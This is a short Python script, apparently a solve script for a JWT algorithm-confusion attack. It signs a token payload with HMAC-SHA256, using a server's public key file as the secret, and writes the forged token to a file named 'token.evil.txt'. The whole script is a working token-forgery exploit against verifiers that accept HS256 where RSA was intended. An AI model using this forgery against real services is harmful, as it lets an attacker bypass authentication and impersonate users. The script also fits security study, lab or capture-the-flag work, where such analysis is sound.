import base64
import hashlib
import hmac

with open('public.pem') as __f:
    KEY = __f.read()
with open('data.txt') as __f:
    PAYLOAD = __f.read()

__signature = base64.urlsafe_b64encode(hmac.new(
    bytes(KEY, encoding='UTF-8'),
    PAYLOAD.encode('UTF-8'),
    hashlib.sha256).digest()).decode('UTF-8').rstrip('=')

with open('token.evil.txt', 'w') as __f:
    __f.write(PAYLOAD + '.' + __signature)

print(PAYLOAD + '.' + __signature)
